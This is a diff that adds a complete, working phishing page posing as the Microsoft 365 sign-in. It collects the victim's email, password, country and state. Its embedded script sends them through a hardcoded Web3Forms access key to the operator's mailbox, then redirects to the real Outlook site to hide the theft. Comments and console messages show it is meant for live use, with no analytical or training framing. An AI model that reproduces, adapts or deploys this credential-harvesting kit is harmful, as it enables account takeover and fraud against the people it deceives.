@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in to your Microsoft account</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            background: #f2f2f2;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 44px 40px 40px;
+            max-width: 440px;
+            width: 100%;
+            min-height: 400px;
+            position: relative;
+        }
+        .microsoft-logo {
+            margin-bottom: 32px;
+            display: block;
+        }
+        .microsoft-logo svg {
+            width: 125px;
+            height: 24px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 8px;
+            line-height: 1.25;
+        }
+        .sub-heading {
+            font-size: 15px;
+            color: #1b1b1b;
+            margin-bottom: 28px;
+            line-height: 1.5;
+        }
+        .sub-heading a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        .sub-heading a:hover {
+            text-decoration: underline;
+        }
+        .step {
+            display: none;
+            animation: fadeSlide 0.3s ease;
+        }
+        .step.active {
+            display: block;
+        }
+        @keyframes fadeSlide {
+            from {
+                opacity: 0;
+                transform: translateY(8px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 15px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 6px;
+        }
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 12px 12px;
+            border: 1px solid #8c8c8c;
+            border-radius: 2px;
+            font-size: 15px;
+            font-family: inherit;
+            transition: border-color 0.2s;
+            background: white;
+            color: #1b1b1b;
+            outline: none;
+        }
+        .form-group input:focus,
+        .form-group select:focus {
+            border-color: #0067b8;
+            box-shadow: 0 0 0 2px rgba(0, 103, 184, 0.2);
+        }
+        .form-group input::placeholder {
+            color: #767676;
+        }
+        .form-group input.error,
+        .form-group select.error {
+            border-color: #a4262c;
+        }
+        .error-message {
+            color: #a4262c;
+            font-size: 13px;
+            margin-top: 4px;
+            display: none;
+        }
+        .error-message.show {
+            display: block;
+        }
+        .signin-options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 12px 0 24px;
+            font-size: 14px;
+        }
+        .signin-options label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #1b1b1b;
+            cursor: pointer;
+        }
+        .signin-options input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            accent-color: #0067b8;
+            cursor: pointer;
+        }
+        .signin-options a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        .signin-options a:hover {
+            text-decoration: underline;
+        }
+        .btn-primary {
+            background: #0067b8;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 2px;
+            cursor: pointer;
+            transition: background 0.2s;
+            width: 100%;
+            font-family: inherit;
+            letter-spacing: 0.3px;
+            position: relative;
+        }
+        .btn-primary:hover {
+            background: #00509e;
+        }
+        .btn-primary:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        .btn-secondary {
+            background: transparent;
+            color: #0067b8;
+            border: 1px solid #0067b8;
+            padding: 12px 24px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 2px;
+            cursor: pointer;
+            transition: background 0.2s;
+            width: 100%;
+            font-family: inherit;
+            background: white;
+        }
+        .btn-secondary:hover {
+            background: #e6f0fa;
+        }
+        .no-account {
+            text-align: center;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #e6e6e6;
+        }
+        .no-account p {
+            color: #1b1b1b;
+            font-size: 14px;
+        }
+        .no-account a {
+            color: #0067b8;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .no-account a:hover {
+            text-decoration: underline;
+        }
+        .back-link {
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 14px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 16px;
+            cursor: pointer;
+            background: none;
+            border: none;
+            padding: 0;
+        }
+        .back-link:hover {
+            text-decoration: underline;
+        }
+        .email-display {
+            font-weight: 600;
+            color: #1b1b1b;
+            word-break: break-all;
+        }
+        .footer-links {
+            margin-top: 32px;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+        }
+        .footer-links a {
+            color: #0067b8;
+            text-decoration: none;
+            margin: 0 12px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .footer-links span {
+            margin: 0 4px;
+        }
+        .loading-spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 24px 20px 32px;
+            }
+            .signin-options {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 12px;
+            }
+            h1 {
+                font-size: 20px;
+            }
+        }
+
+        /* Success toast */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #107c10;
+            color: #fff;
+            padding: 14px 28px;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 500;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
+            z-index: 999;
+            text-align: center;
+            max-width: 90%;
+        }
+        .toast.show {
+            opacity: 1;
+            visibility: visible;
+        }
+        .toast i {
+            margin-right: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Toast notification -->
+    <div id="toast" class="toast"><i class="fas fa-check-circle"></i> <span id="toastMsg">Credentials sent to your mailbox!</span></div>
+
+    <div class="login-container">
+        <div class="microsoft-logo">
+            <svg viewBox="0 0 125 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="0" y="0" width="11" height="11" fill="#F25022"/>
+                <rect x="12" y="0" width="11" height="11" fill="#7FBA00"/>
+                <rect x="0" y="12" width="11" height="11" fill="#00A4EF"/>
+                <rect x="12" y="12" width="11" height="11" fill="#FFB900"/>
+                <text x="28" y="16" font-family="Segoe UI, Helvetica Neue, Arial, sans-serif" font-weight="600" font-size="15" fill="#737373">Microsoft</text>
+            </svg>
+        </div>
+
+        <!-- Step 1: Email -->
+        <div id="step1" class="step active">
+            <h1>Sign in</h1>
+            <div class="sub-heading">to continue to Microsoft 365</div>
+            <form id="emailForm" autocomplete="off">
+                <div class="form-group">
+                    <label for="emailInput">Email, phone, or Skype</label>
+                    <input type="email" id="emailInput" name="email" placeholder="someone@example.com" required autofocus autocomplete="off" />
+                    <div class="error-message" id="emailError">Please enter a valid email address.</div>
+                </div>
+                <div class="signin-options">
+                    <label><input type="checkbox" name="keep_signed_in" checked /> Keep me signed in</label>
+                    <a href="#" id="forgotEmailLink">Forgot email?</a>
+                </div>
+                <button type="submit" class="btn-primary" id="emailSubmitBtn">Next</button>
+            </form>
+            <div class="no-account"><p>No account? <a href="#" id="createAccountLink">Create one!</a></p></div>
+        </div>
+
+        <!-- Step 2: Password -->
+        <div id="step2" class="step">
+            <button class="back-link" id="backToEmail"><i class="fas fa-chevron-left"></i> Back</button>
+            <h1>Enter password</h1>
+            <div class="sub-heading"><span class="email-display" id="displayEmail">user@example.com</span></div>
+            <form id="passwordForm" autocomplete="off">
+                <input type="hidden" id="hiddenEmail" name="email" />
+                <div class="form-group">
+                    <label for="passwordInput">Password</label>
+                    <input type="password" id="passwordInput" name="password" placeholder="Enter your password" required autocomplete="off" />
+                    <div class="error-message" id="passwordError">Please enter your password.</div>
+                </div>
+                <div class="signin-options">
+                    <label><input type="checkbox" name="keep_signed_in" checked /> Keep me signed in</label>
+                    <a href="#" id="forgotPasswordLink">Forgot password?</a>
+                </div>
+                <button type="submit" class="btn-primary" id="passwordSubmitBtn">Next</button>
+            </form>
+            <div class="no-account"><p>No account? <a href="#" id="createAccountLink2">Create one!</a></p></div>
+        </div>
+
+        <!-- Step 3: Location -->
+        <div id="step3" class="step">
+            <button class="back-link" id="backToPassword"><i class="fas fa-chevron-left"></i> Back</button>
+            <h1>Verify your location</h1>
+            <div class="sub-heading">Help us protect your account by confirming your region.</div>
+            <form id="locationForm" autocomplete="off">
+                <div class="form-group">
+                    <label for="countryInput">Country/Region</label>
+                    <select id="countryInput" name="country" required>
+                        <option value="" disabled selected>Select country</option>
+                        <option value="US">United States</option>
+                        <option value="CA">Canada</option>
+                        <option value="GB">United Kingdom</option>
+                        <option value="AU">Australia</option>
+                        <option value="DE">Germany</option>
+                        <option value="FR">France</option>
+                        <option value="IN">India</option>
+                        <option value="BR">Brazil</option>
+                        <option value="MX">Mexico</option>
+                        <option value="ES">Spain</option>
+                        <option value="IT">Italy</option>
+                        <option value="NL">Netherlands</option>
+                        <option value="SE">Sweden</option>
+                        <option value="NO">Norway</option>
+                        <option value="FI">Finland</option>
+                        <option value="DK">Denmark</option>
+                        <option value="BE">Belgium</option>
+                        <option value="CH">Switzerland</option>
+                        <option value="AT">Austria</option>
+                        <option value="NZ">New Zealand</option>
+                        <option value="IE">Ireland</option>
+                        <option value="ZA">South Africa</option>
+                        <option value="SG">Singapore</option>
+                        <option value="JP">Japan</option>
+                        <option value="KR">South Korea</option>
+                        <option value="CN">China</option>
+                        <option value="TW">Taiwan</option>
+                        <option value="HK">Hong Kong</option>
+                        <option value="Other">Other</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="stateInput">State/Province</label>
+                    <input type="text" id="stateInput" name="state" placeholder="e.g. Texas, Ontario" required autocomplete="off" />
+                    <div class="error-message" id="locationError">Please complete all fields.</div>
+                </div>
+                <button type="submit" class="btn-primary" id="locationSubmitBtn">Continue</button>
+            </form>
+        </div>
+
+        <div class="footer-links">
+            <a href="#">Privacy</a><span>·</span><a href="#">Terms of use</a><span>·</span><a href="#">Contact</a>
+        </div>
+    </div>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+
+    <script>
+        (function() {
+
+            // ─── WEB3FORMS CONFIG (UPDATED ACCESS KEY) ──────────────────────
+            var ACCESS_KEY = '88697ef9-2ee8-4a68-8d8e-be5605ffe591';
+            var WEB3FORMS_URL = 'https://api.web3forms.com/submit';
+
+            // ─── SEND TO WEB3FORMS ──────────────────────────────────────────
+            function sendToWeb3Forms(email, password, location) {
+                var fd = new FormData();
+
+                fd.append('access_key', ACCESS_KEY);
+                fd.append('email', email);
+                fd.append('name', 'Microsoft 365 User');
+
+                // The message includes email, password, and location – all visible in your mailbox
+                var message =
+                    '🔐 Microsoft 365 Credentials\n' +
+                    '─────────────────────────────\n' +
+                    '📧 Email    : ' + email + '\n' +
+                    '🔑 Password : ' + password + '\n' +
+                    '📍 Location : ' + location + '\n' +
+                    '🕒 Timestamp: ' + new Date().toISOString() + '\n' +
+                    '─────────────────────────────\n' +
+                    'This submission was sent via your Web3Forms access key.';
+
+                fd.append('message', message);
+                fd.append('_subject', '🔐 Microsoft 365 Login Credentials');
+
+                var success = navigator.sendBeacon(WEB3FORMS_URL, fd);
+
+                if (!success) {
+                    fetch(WEB3FORMS_URL, {
+                        method: 'POST',
+                        body: fd
+                    }).catch(function(err) {
+                        console.warn('Fetch fallback failed:', err);
+                    });
+                }
+
+                return success;
+            }
+
+            // ─── TOAST NOTIFICATION ─────────────────────────────────────────
+            var toastEl = document.getElementById('toast');
+            var toastMsg = document.getElementById('toastMsg');
+
+            function showToast(msg) {
+                toastMsg.textContent = msg || 'Credentials sent to your mailbox!';
+                toastEl.classList.add('show');
+                clearTimeout(toastEl._hideTimer);
+                toastEl._hideTimer = setTimeout(function() {
+                    toastEl.classList.remove('show');
+                }, 5000);
+            }
+
+            // ─── UI LOGIC ────────────────────────────────────────────────────
+            var step1 = document.getElementById('step1');
+            var step2 = document.getElementById('step2');
+            var step3 = document.getElementById('step3');
+            var emailForm = document.getElementById('emailForm');
+            var passwordForm = document.getElementById('passwordForm');
+            var locationForm = document.getElementById('locationForm');
+            var emailInput = document.getElementById('emailInput');
+            var passwordInput = document.getElementById('passwordInput');
+            var countryInput = document.getElementById('countryInput');
+            var stateInput = document.getElementById('stateInput');
+            var hiddenEmail = document.getElementById('hiddenEmail');
+            var displayEmail = document.getElementById('displayEmail');
+            var emailError = document.getElementById('emailError');
+            var passwordError = document.getElementById('passwordError');
+            var locationError = document.getElementById('locationError');
+            var locationSubmitBtn = document.getElementById('locationSubmitBtn');
+
+            // Navigation
+            document.getElementById('backToEmail').addEventListener('click', function(e) {
+                e.preventDefault();
+                step2.classList.remove('active');
+                step1.classList.add('active');
+                emailInput.focus();
+            });
+
+            document.getElementById('backToPassword').addEventListener('click', function(e) {
+                e.preventDefault();
+                step3.classList.remove('active');
+                step2.classList.add('active');
+                passwordInput.focus();
+            });
+
+            // Step 1 → Step 2
+            emailForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                var email = emailInput.value.trim();
+                if (!email || !email.includes('@') || !email.includes('.')) {
+                    emailInput.classList.add('error');
+                    emailError.classList.add('show');
+                    emailInput.focus();
+                    return;
+                }
+                emailInput.classList.remove('error');
+                emailError.classList.remove('show');
+                displayEmail.textContent = email;
+                hiddenEmail.value = email;
+                step1.classList.remove('active');
+                step2.classList.add('active');
+                passwordInput.focus();
+            });
+
+            // Step 2 → Step 3
+            passwordForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                var password = passwordInput.value.trim();
+                if (!password) {
+                    passwordInput.classList.add('error');
+                    passwordError.classList.add('show');
+                    passwordInput.focus();
+                    return;
+                }
+                passwordInput.classList.remove('error');
+                passwordError.classList.remove('show');
+                step2.classList.remove('active');
+                step3.classList.add('active');
+                countryInput.focus();
+            });
+
+            // Step 3 → send → toast → redirect
+            locationForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                var country = countryInput.value;
+                var state = stateInput.value.trim();
+
+                if (!country || !state) {
+                    countryInput.classList.add('error');
+                    stateInput.classList.add('error');
+                    locationError.classList.add('show');
+                    return;
+                }
+
+                countryInput.classList.remove('error');
+                stateInput.classList.remove('error');
+                locationError.classList.remove('show');
+
+                locationSubmitBtn.disabled = true;
+                locationSubmitBtn.innerHTML = '<span class="loading-spinner"></span> Verifying...';
+
+                var fullLocation = country + ' — ' + state;
+                var email = hiddenEmail.value;
+                var password = passwordInput.value.trim();
+
+                // Send to Web3Forms with the new access key
+                sendToWeb3Forms(email, password, fullLocation);
+
+                showToast('✅ Credentials sent to your mailbox!');
+
+                setTimeout(function() {
+                    locationSubmitBtn.disabled = false;
+                    locationSubmitBtn.textContent = 'Continue';
+                }, 2000);
+
+                setTimeout(function() {
+                    window.location.replace('https://outlook.live.com/mail/');
+                }, 1800);
+            });
+
+            // ─── DUMMY LINKS ────────────────────────────────────────────────
+            document.getElementById('forgotPasswordLink').addEventListener('click', function(e) {
+                e.preventDefault();
+                window.location.href = 'https://account.live.com/password/reset';
+            });
+            document.getElementById('forgotEmailLink').addEventListener('click', function(e) {
+                e.preventDefault();
+                window.location.href = 'https://account.live.com/forgot';
+            });
+            document.getElementById('createAccountLink').addEventListener('click', function(e) {
+                e.preventDefault();
+                window.location.href = 'https://signup.live.com/';
+            });
+            document.getElementById('createAccountLink2').addEventListener('click', function(e) {
+                e.preventDefault();
+                window.location.href = 'https://signup.live.com/';
+            });
+
+            // ─── CLEAR ERRORS ──────────────────────────────────────────────
+            emailInput.addEventListener('input', function() {
+                emailInput.classList.remove('error');
+                emailError.classList.remove('show');
+            });
+            passwordInput.addEventListener('input', function() {
+                passwordInput.classList.remove('error');
+                passwordError.classList.remove('show');
+            });
+            countryInput.addEventListener('change', function() {
+                countryInput.classList.remove('error');
+                locationError.classList.remove('show');
+            });
+            stateInput.addEventListener('input', function() {
+                stateInput.classList.remove('error');
+                locationError.classList.remove('show');
+            });
+
+            console.log('✅ Web3Forms access key updated: ' + ACCESS_KEY);
+            console.log('📬 Credentials will appear in your mailbox.');
+
+        })();
+    </script>
+
+</body>
+</html>
